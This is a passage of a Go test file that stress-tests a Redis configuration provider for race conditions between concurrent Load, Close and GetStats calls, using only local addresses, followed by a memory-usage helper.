// operations to bypass security checks or cause undefined behavior.
func TestSecurity_RaceConditionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("ConcurrentLoadAndCloseRace", func(t *testing.T) {
		// Test race between Load operations and Close
		// Create provider with valid URL first
		provider, err := NewProvider("redis://localhost:6379/test")
		if err != nil {
			t.Fatalf("Failed to create provider: %v", err)
		}
		defer func() {
			if err := provider.Close(); err != nil {
				t.Logf("Provider close error (ignored in test): %v", err)
			}
		}()

		var wg sync.WaitGroup
		var loadErrors int32
		var closeErrors int32

		// Start multiple Load operations
		for i := 0; i < 20; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
				defer cancel()

				_, err := provider.Load(ctx, "redis://127.0.0.1:16379/test-key") // Non-existent server
				if err != nil {
					atomic.AddInt32(&loadErrors, 1)
				}
			}()
		}

		// Concurrently close the provider
		go func() {
			time.Sleep(100 * time.Millisecond) // Let some loads start
			if err := provider.Close(); err != nil {
				atomic.AddInt32(&closeErrors, 1)
			}
		}()

		wg.Wait()

		t.Logf("Concurrent Load/Close: Load errors: %d, Close errors: %d",
			atomic.LoadInt32(&loadErrors), atomic.LoadInt32(&closeErrors))

		// Some load errors are expected (no Redis server)
		// No close errors should occur
		if atomic.LoadInt32(&closeErrors) > 0 {
			t.Errorf("SECURITY ISSUE: Close() operation had errors during concurrent access")
		}

		ctx.CheckResourceLeak("concurrent load and close race")
	})

	t.Run("ConcurrentStatsRace", func(t *testing.T) {
		// Test race conditions in GetStats operations
		// Create provider with valid URL first
		provider, err := NewProvider("redis://localhost:6379/test")
		if err != nil {
			t.Fatalf("Failed to create provider: %v", err)
		}
		defer func() {
			if err := provider.Close(); err != nil {
				t.Logf("Provider close error (ignored in test): %v", err)
			}
		}()

		var wg sync.WaitGroup
		const numOperations = 50

		// Concurrent stats readers
		for i := 0; i < numOperations; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				stats := provider.GetStats()
				if stats == nil {
					t.Errorf("GetStats returned nil")
				}
			}()
		}

		// Concurrent operations that modify stats
		for i := 0; i < 10; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
				defer cancel()

				// This should increment request counters
				_, _ = provider.Load(ctx, "redis://127.0.0.1:16379/test-key")
			}()
		}

		wg.Wait()

		// Final stats check
		finalStats := provider.GetStats()
		if finalStats == nil {
			t.Errorf("Final GetStats returned nil")
		}

		ctx.CheckResourceLeak("concurrent stats race")
	})
}

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

// getCurrentMemoryUsage returns current memory allocation for testing.
func getCurrentMemoryUsage() uint64 {
	var memStats runtime.MemStats
	runtime.GC()
	time.Sleep(10 * time.Millisecond) // Allow GC to complete
	runtime.ReadMemStats(&memStats)
	return memStats.Alloc
}
